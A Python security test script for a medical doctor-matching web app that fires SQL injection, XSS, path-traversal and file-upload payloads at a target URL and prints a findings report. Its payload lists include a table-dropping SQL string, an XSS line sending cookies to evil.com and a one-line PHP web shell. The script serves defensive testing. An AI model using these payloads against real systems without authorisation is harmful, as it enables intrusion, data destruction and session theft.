#!/usr/bin/env python3
"""
Comprehensive Security Test Suite for Doctor AI Medical Matching System

This script tests for common security vulnerabilities including:
- SQL Injection
- XSS (Cross-Site Scripting)
- Authentication bypass
- Session security
- Authorization flaws
- Rate limiting
- Security headers
- Information disclosure

Usage:
    python comprehensive_security_test.py --target http://localhost:5000
    python comprehensive_security_test.py --target https://yourdomain.com --verbose
"""

import requests
import argparse
import json
import time
import threading
import random
import string
from urllib.parse import urljoin, urlparse
from datetime import datetime
import sys
import warnings

# Suppress SSL warnings for testing
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

class SecurityTester:
    def __init__(self, target_url, verbose=False):
        self.target_url = target_url.rstrip('/')
        self.verbose = verbose
        self.session = requests.Session()
        self.session.verify = False  # For testing only
        self.results = {
            'vulnerabilities': [],
            'warnings': [],
            'passed': [],
            'errors': []
        }
        
    def log(self, message, level='INFO'):
        timestamp = datetime.now().strftime('%H:%M:%S')
        if level == 'VULN':
            print(f"🚨 [{timestamp}] VULNERABILITY: {message}")
            self.results['vulnerabilities'].append(message)
        elif level == 'WARN':
            print(f"⚠️  [{timestamp}] WARNING: {message}")
            self.results['warnings'].append(message)
        elif level == 'PASS':
            print(f"✅ [{timestamp}] PASSED: {message}")
            self.results['passed'].append(message)
        elif level == 'ERROR':
            print(f"❌ [{timestamp}] ERROR: {message}")
            self.results['errors'].append(message)
        elif self.verbose:
            print(f"ℹ️  [{timestamp}] {message}")

    def test_sql_injection(self):
        """Test for SQL injection vulnerabilities"""
        self.log("Testing SQL Injection vulnerabilities...")
        
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM admin_users --",
            "1' OR 1=1 --",
            "admin'--",
            "' OR 1=1#",
            "' OR 'x'='x",
            "1; SELECT * FROM information_schema.tables--",
            "' UNION SELECT username, password FROM admin_users--"
        ]
        
        # Test login form
        login_endpoints = ['/admin/login', '/login']
        for endpoint in login_endpoints:
            url = urljoin(self.target_url, endpoint)
            for payload in sql_payloads:
                try:
                    data = {
                        'username': payload,
                        'password': 'test'
                    }
                    response = self.session.post(url, data=data, timeout=10)
                    
                    # Check for successful login (bad)
                    if response.status_code == 200 and any(keyword in response.text.lower() 
                                                         for keyword in ['dashboard', 'welcome', 'admin panel']):
                        self.log(f"SQL Injection bypass possible at {endpoint} with payload: {payload}", 'VULN')
                    
                    # Check for database errors (information disclosure)
                    error_indicators = ['sqlite', 'database error', 'sql syntax', 'mysql', 'postgresql']
                    if any(error in response.text.lower() for error in error_indicators):
                        self.log(f"Database error disclosure at {endpoint} with payload: {payload}", 'WARN')
                        
                except requests.RequestException as e:
                    self.log(f"Error testing SQL injection at {endpoint}: {e}", 'ERROR')
        
        # Test search functionality
        search_endpoints = ['/search', '/analyze', '/api/search']
        for endpoint in search_endpoints:
            url = urljoin(self.target_url, endpoint)
            for payload in sql_payloads:
                try:
                    # Test GET parameters
                    response = self.session.get(url, params={'q': payload, 'search': payload}, timeout=10)
                    
                    # Test POST data
                    response = self.session.post(url, data={
                        'symptoms': payload,
                        'search': payload,
                        'query': payload
                    }, timeout=10)
                    
                    # Check for database errors
                    error_indicators = ['sqlite', 'database error', 'sql syntax', 'mysql', 'postgresql']
                    if any(error in response.text.lower() for error in error_indicators):
                        self.log(f"Database error disclosure at {endpoint} with payload: {payload}", 'WARN')
                        
                except requests.RequestException:
                    pass  # Endpoint might not exist
        
        self.log("SQL Injection tests completed", 'PASS')

    def test_xss_vulnerabilities(self):
        """Test for Cross-Site Scripting vulnerabilities"""
        self.log("Testing XSS vulnerabilities...")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "';alert('XSS');//",
            "<script>document.location='http://evil.com/'+document.cookie</script>",
            "<img src='x' onerror='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>",
            "<svg/onload=alert(1)>"
        ]
        
        # Test forms that accept user input
        test_endpoints = [
            ('/analyze', {'symptoms': '', 'age': '25', 'gender': 'male'}),
            ('/report-bug', {'description': '', 'contact_info': 'test@test.com'}),
            ('/search', {'q': ''}),
            ('/admin/severe-cases/1/review', {'notes': ''})
        ]
        
        for endpoint, base_data in test_endpoints:
            url = urljoin(self.target_url, endpoint)
            for payload in xss_payloads:
                try:
                    # Test each form field
                    for field in base_data.keys():
                        test_data = base_data.copy()
                        test_data[field] = payload
                        
                        response = self.session.post(url, data=test_data, timeout=10)
                        
                        # Check if payload appears unescaped in response
                        if payload in response.text:
                            self.log(f"Potential XSS vulnerability at {endpoint} in field '{field}' with payload: {payload}", 'VULN')
                        
                        # Also test GET parameters
                        response = self.session.get(url, params={field: payload}, timeout=10)
                        if payload in response.text:
                            self.log(f"Potential XSS vulnerability at {endpoint} in GET parameter '{field}' with payload: {payload}", 'VULN')
                            
                except requests.RequestException:
                    pass  # Endpoint might not exist or require authentication
        
        self.log("XSS tests completed", 'PASS')

    def test_authentication_bypass(self):
        """Test for authentication bypass vulnerabilities"""
        self.log("Testing authentication bypass...")
        
        # Test direct access to admin pages
        admin_endpoints = [
            '/admin/dashboard',
            '/admin/users',
            '/admin/config',
            '/admin/analytics',
            '/admin/severe-cases',
            '/admin/doctors',
            '/admin/bug-reports'
        ]
        
        for endpoint in admin_endpoints:
            url = urljoin(self.target_url, endpoint)
            try:
                response = self.session.get(url, timeout=10)
                
                # Should redirect to login or return 401/403
                if response.status_code == 200 and 'login' not in response.text.lower():
                    self.log(f"Potential authentication bypass at {endpoint} - accessible without login", 'VULN')
                elif response.status_code in [302, 401, 403]:
                    self.log(f"Authentication properly enforced at {endpoint}", 'PASS')
                    
            except requests.RequestException as e:
                self.log(f"Error testing {endpoint}: {e}", 'ERROR')
        
        # Test session fixation
        try:
            # Get initial session
            response = self.session.get(urljoin(self.target_url, '/admin/login'))
            initial_cookies = dict(self.session.cookies)
            
            # Attempt login with fake credentials
            login_data = {'username': 'admin', 'password': 'admin'}
            response = self.session.post(urljoin(self.target_url, '/admin/login'), data=login_data)
            
            # Check if session changed (it should)
            new_cookies = dict(self.session.cookies)
            if initial_cookies == new_cookies:
                self.log("Potential session fixation vulnerability - session not regenerated after login attempt", 'WARN')
            else:
                self.log("Session properly regenerated after login", 'PASS')
                
        except requests.RequestException as e:
            self.log(f"Error testing session fixation: {e}", 'ERROR')

    def test_authorization_flaws(self):
        """Test for authorization and privilege escalation flaws"""
        self.log("Testing authorization flaws...")
        
        # Test privilege escalation by trying to access admin functions
        # This would require valid credentials to test properly
        
        # Test direct object references
        sensitive_endpoints = [
            '/admin/users/1',
            '/admin/severe-cases/1',
            '/admin/api/user-permissions/1',
            '/api/user/1',
            '/admin/users/1/edit'
        ]
        
        for endpoint in sensitive_endpoints:
            url = urljoin(self.target_url, endpoint)
            try:
                response = self.session.get(url, timeout=10)
                
                # Should require proper authorization
                if response.status_code == 200 and len(response.text) > 100:
                    self.log(f"Potential insecure direct object reference at {endpoint}", 'WARN')
                    
            except requests.RequestException:
                pass

    def test_rate_limiting(self):
        """Test rate limiting implementation"""
        self.log("Testing rate limiting...")
        
        # Test login rate limiting
        login_url = urljoin(self.target_url, '/admin/login')
        
        def make_login_request():
            return self.session.post(login_url, data={
                'username': 'testuser',
                'password': 'wrongpassword'
            }, timeout=5)
        
        try:
            # Make rapid requests
            responses = []
            for i in range(20):
                response = make_login_request()
                responses.append(response.status_code)
                time.sleep(0.1)
            
            # Check for rate limiting (429 status codes or similar)
            rate_limited = [r for r in responses if r in [429, 503]]
            if len(rate_limited) > 0:
                self.log("Rate limiting is implemented", 'PASS')
            else:
                self.log("No rate limiting detected - potential DoS vulnerability", 'WARN')
                
        except requests.RequestException as e:
            self.log(f"Error testing rate limiting: {e}", 'ERROR')

    def test_security_headers(self):
        """Test for proper security headers"""
        self.log("Testing security headers...")
        
        try:
            response = self.session.get(self.target_url, timeout=10)
            headers = response.headers
            
            # Required security headers
            security_headers = {
                'X-Content-Type-Options': 'nosniff',
                'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
                'X-XSS-Protection': '1; mode=block',
                'Strict-Transport-Security': None,  # Should exist for HTTPS
                'Content-Security-Policy': None,    # Should exist
                'Referrer-Policy': None            # Should exist
            }
            
            for header, expected_values in security_headers.items():
                if header not in headers:
                    self.log(f"Missing security header: {header}", 'WARN')
                else:
                    if expected_values and isinstance(expected_values, list):
                        if headers[header] not in expected_values:
                            self.log(f"Incorrect {header} header value: {headers[header]}", 'WARN')
                        else:
                            self.log(f"Correct {header} header found", 'PASS')
                    elif expected_values and headers[header] != expected_values:
                        self.log(f"Incorrect {header} header value: {headers[header]}", 'WARN')
                    else:
                        self.log(f"{header} header found", 'PASS')
            
            # Check for information disclosure headers
            disclosure_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version']
            for header in disclosure_headers:
                if header in headers:
                    self.log(f"Information disclosure header found: {header}: {headers[header]}", 'WARN')
                    
        except requests.RequestException as e:
            self.log(f"Error testing security headers: {e}", 'ERROR')

    def test_information_disclosure(self):
        """Test for information disclosure vulnerabilities"""
        self.log("Testing information disclosure...")
        
        # Test for debug information
        debug_endpoints = [
            '/debug',
            '/test',
            '/.env',
            '/config',
            '/admin/debug',
            '/phpinfo.php',
            '/info.php',
            '/server-info',
            '/server-status'
        ]
        
        for endpoint in debug_endpoints:
            url = urljoin(self.target_url, endpoint)
            try:
                response = self.session.get(url, timeout=10)
                
                if response.status_code == 200:
                    # Check for sensitive information
                    sensitive_patterns = [
                        'database', 'password', 'secret', 'key', 'token',
                        'debug', 'traceback', 'stack trace', 'error',
                        'config', 'environment'
                    ]
                    
                    content_lower = response.text.lower()
                    for pattern in sensitive_patterns:
                        if pattern in content_lower:
                            self.log(f"Potential information disclosure at {endpoint} - contains '{pattern}'", 'WARN')
                            break
                            
            except requests.RequestException:
                pass

    def test_file_upload_vulnerabilities(self):
        """Test file upload security"""
        self.log("Testing file upload vulnerabilities...")
        
        upload_endpoints = [
            '/upload',
            '/admin/upload',
            '/report-bug',  # Might have file upload
            '/api/upload'
        ]
        
        # Test malicious file uploads
        malicious_files = {
            'shell.php': b'<?php system($_GET["cmd"]); ?>',
            'test.html': b'<script>alert("XSS")</script>',
            'large_file.txt': b'A' * (10 * 1024 * 1024),  # 10MB file
            '../../../etc/passwd': b'test content'
        }
        
        for endpoint in upload_endpoints:
            url = urljoin(self.target_url, endpoint)
            for filename, content in malicious_files.items():
                try:
                    files = {'file': (filename, content, 'text/plain')}
                    response = self.session.post(url, files=files, timeout=30)
                    
                    if response.status_code == 200 and 'error' not in response.text.lower():
                        self.log(f"Potential file upload vulnerability at {endpoint} - accepted file: {filename}", 'WARN')
                        
                except requests.RequestException:
                    pass

    def test_csrf_protection(self):
        """Test CSRF protection"""
        self.log("Testing CSRF protection...")
        
        # Test forms for CSRF tokens
        form_endpoints = [
            '/admin/login',
            '/report-bug',
            '/admin/config'
        ]
        
        for endpoint in form_endpoints:
            url = urljoin(self.target_url, endpoint)
            try:
                response = self.session.get(url, timeout=10)
                
                # Check for CSRF tokens in forms
                csrf_indicators = ['csrf', 'token', '_token', 'authenticity_token']
                has_csrf = any(indicator in response.text.lower() for indicator in csrf_indicators)
                
                if not has_csrf and '<form' in response.text.lower():
                    self.log(f"Potential CSRF vulnerability - no token found in form at {endpoint}", 'WARN')
                elif has_csrf:
                    self.log(f"CSRF protection found at {endpoint}", 'PASS')
                    
            except requests.RequestException:
                pass

    def run_all_tests(self):
        """Run all security tests"""
        print(f"\n🔒 Starting comprehensive security test for: {self.target_url}")
        print("=" * 80)
        
        start_time = time.time()
        
        # Run all tests
        test_methods = [
            self.test_security_headers,
            self.test_information_disclosure,
            self.test_authentication_bypass,
            self.test_sql_injection,
            self.test_xss_vulnerabilities,
            self.test_authorization_flaws,
            self.test_csrf_protection,
            self.test_file_upload_vulnerabilities,
            self.test_rate_limiting
        ]
        
        for test_method in test_methods:
            try:
                test_method()
            except Exception as e:
                self.log(f"Error in {test_method.__name__}: {e}", 'ERROR')
        
        # Generate report
        end_time = time.time()
        duration = end_time - start_time
        
        print("\n" + "=" * 80)
        print("🔒 SECURITY TEST REPORT")
        print("=" * 80)
        
        print(f"🚨 VULNERABILITIES FOUND: {len(self.results['vulnerabilities'])}")
        for vuln in self.results['vulnerabilities']:
            print(f"   • {vuln}")
        
        print(f"\n⚠️  WARNINGS: {len(self.results['warnings'])}")
        for warning in self.results['warnings']:
            print(f"   • {warning}")
        
        print(f"\n✅ TESTS PASSED: {len(self.results['passed'])}")
        if self.verbose:
            for passed in self.results['passed']:
                print(f"   • {passed}")
        
        if self.results['errors']:
            print(f"\n❌ ERRORS: {len(self.results['errors'])}")
            for error in self.results['errors']:
                print(f"   • {error}")
        
        print(f"\n⏱️  Test completed in {duration:.2f} seconds")
        
        # Security score
        total_checks = len(self.results['vulnerabilities']) + len(self.results['warnings']) + len(self.results['passed'])
        if total_checks > 0:
            score = (len(self.results['passed']) / total_checks) * 100
            print(f"🎯 Security Score: {score:.1f}%")
        
        # Recommendations
        print("\n📋 RECOMMENDATIONS:")
        if self.results['vulnerabilities']:
            print("   🚨 CRITICAL: Fix all vulnerabilities immediately")
        if self.results['warnings']:
            print("   ⚠️  IMPORTANT: Review and address all warnings")
        if not self.results['vulnerabilities'] and not self.results['warnings']:
            print("   ✅ Good job! No major security issues found")
        
        print("\n💡 Additional recommendations:")
        print("   • Run this test regularly (weekly/monthly)")
        print("   • Consider professional penetration testing")
        print("   • Implement security monitoring and logging")
        print("   • Keep all dependencies updated")
        print("   • Review and update security policies")

def main():
    parser = argparse.ArgumentParser(description='Comprehensive Security Test Suite')
    parser.add_argument('--target', required=True, help='Target URL (e.g., http://localhost:5000)')
    parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')
    parser.add_argument('--output', '-o', help='Output file for results (JSON format)')
    
    args = parser.parse_args()
    
    # Validate URL
    parsed_url = urlparse(args.target)
    if not parsed_url.scheme or not parsed_url.netloc:
        print("❌ Invalid URL format. Please use format: http://domain.com or https://domain.com")
        sys.exit(1)
    
    # Run tests
    tester = SecurityTester(args.target, args.verbose)
    tester.run_all_tests()
    
    # Save results if requested
    if args.output:
        with open(args.output, 'w') as f:
            json.dump(tester.results, f, indent=2)
        print(f"\n💾 Results saved to: {args.output}")

if __name__ == "__main__":
    main()
